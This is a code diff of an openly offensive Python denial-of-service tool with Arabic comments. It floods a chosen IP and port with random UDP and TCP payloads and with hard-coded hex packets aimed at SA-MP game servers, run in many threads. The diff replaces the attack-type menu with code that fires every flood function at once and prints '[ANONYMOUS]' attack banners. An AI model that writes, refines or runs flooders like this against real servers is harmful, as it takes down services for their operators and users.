@@ -43,16 +43,20 @@ times = int(input("Packet:"))
 threads = int(input("Threads:"))
 fake_ip = '182.21.20.32'
 
-# أنواع الهجمات
-print("\nChoose Attack Type:")
-print("1. UDP Flood")
-print("2. TCP Flood (Stream)")
-print("3. Fake Player Flooding")
-print("4. Custom Attack (Simple Stream)")
+# تعريف المتغير Pacotes بشكل صحيح
+Pacotes = [
+    codecs.decode("53414d5090d91d4d611e700a465b00", "hex_codec"),
+    codecs.decode("53414d509538e1a9611e63", "hex_codec"),
+    codecs.decode("53414d509538e1a9611e69", "hex_codec"),
+    codecs.decode("53414d509538e1a9611e72", "hex_codec"),
+    codecs.decode("081e62da", "hex_codec"),
+    codecs.decode("081e77da", "hex_codec"),
+    codecs.decode("081e4dda", "hex_codec"),
+    codecs.decode("021efd40", "hex_codec"),
+    codecs.decode("081e7eda", "hex_codec")
+]
 
-attack_type = int(input("Enter Attack Type Number (1-4): "))
-
-# هجوم UDP Flood
+# الدوال المختلفة للهجوم
 def run():
     data = random._urandom(1460)
     while True:
@@ -65,7 +69,6 @@ def run():
         except:
             print("[ANONYMOUS] STRIKES BACK!")
 
-# هجوم TCP Flood (Stream)
 def run2():
     data = random._urandom(1204)
     while True:
@@ -80,7 +83,6 @@ def run2():
             s.close()
             print("[ANONYMOUS] STRIKES BACK!")
 
-# هجوم Fake Player Flooding
 def run3():
     data = random._urandom(999)
     while True:
@@ -95,8 +97,21 @@ def run3():
             s.close()
             print("[ANONYMOUS] ynikom!")
 
-# هجوم Custom Stream (TCP)
 def run4():
+    data = random._urandom(818)
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip, port))
+            s.send(data)
+            for x in range(times):
+                s.send(data)
+            print("[ANONYMOUS] YOUR ATTACK HAS BEEN LAUNCHED!!!")
+        except:
+            s.close()
+            print("[ANONYMOUS] is back!")
+
+def run5():
     data = random._urandom(16)
     while True:
         try:
@@ -110,12 +125,12 @@ def run4():
             s.close()
             print("[ANONYMOUS] Anonaymous ynikom!")
 
-# هجوم Fake Player Flooding بواسطة الأكواد المقررة
+# تعريف الكلاس MyThread بشكل صحيح
 class MyThread(threading.Thread):
     def run(self):
         while True:
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            msg = Pacotes[random.randrange(0, 5)]
+            msg = Pacotes[random.randrange(0, 5)]  # استخدام Pacotes بشكل صحيح
             sock.sendto(msg, (ip, int(port)))
             if int(port) == 7777:
                 sock.sendto(Pacotes[5], (ip, int(port)))
@@ -126,6 +141,7 @@ class MyThread(threading.Thread):
             elif int(port) == 7784:
                 sock.sendto(Pacotes[7], (ip, int(port)))
 
+# تشغيل الخيوط
 if __name__ == '__main__':
     try:
         for x in range(200):
@@ -135,25 +151,12 @@ if __name__ == '__main__':
     except KeyboardInterrupt:
         os.system('cls' if os.name == 'nt' else 'clear')
 
-# بدء تنفيذ الهجوم بناءً على الاختيار
+# تشغيل الهجمات بناءً على الاختيار
 for y in range(threads):
-    if attack_type == 1:  # UDP Flood
-        if choice == 'y':
-            threading.Thread(target=run).start()
-        else:
-            threading.Thread(target=run4).start()
-    elif attack_type == 2:  # TCP Flood (Stream)
-        if choice == 'y':
-            threading.Thread(target=run2).start()
-        else:
-            threading.Thread(target=run4).start()
-    elif attack_type == 3:  # Fake Player Flooding
-        if choice == 'y':
-            threading.Thread(target=run3).start()
-        else:
-            threading.Thread(target=run4).start()
-    elif attack_type == 4:  # Custom Attack (Stream)
-        if choice == 'y':
-            threading.Thread(target=run5).start()
-        else:
-            threading.Thread(target=run4).start()
+    if choice == 'y':
+        threading.Thread(target=run).start()
+        threading.Thread(target=run2).start()
+        threading.Thread(target=run3).start()
+        threading.Thread(target=run4).start()
+    else:
+        threading.Thread(target=run5).start()
